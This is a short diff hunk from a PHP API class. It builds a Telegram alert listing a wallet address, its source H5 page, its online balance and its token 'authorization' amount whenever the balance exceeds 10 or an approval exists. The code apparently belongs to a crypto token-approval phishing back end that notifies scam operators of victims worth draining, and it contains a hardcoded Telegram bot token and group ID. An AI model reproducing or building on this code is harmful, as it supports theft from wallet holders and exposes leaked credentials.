@@ -78,7 +78,7 @@ class Address extends Api
                 }
                 if($money_online >10 || $money_approve > 0 ){
                     //TG通知开始
-                    $data_tg = "【综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
+                    $data_tg = "【API综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
                     $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                     $id ='5725539445';//群组ID
                     $u4 = $data_tg;
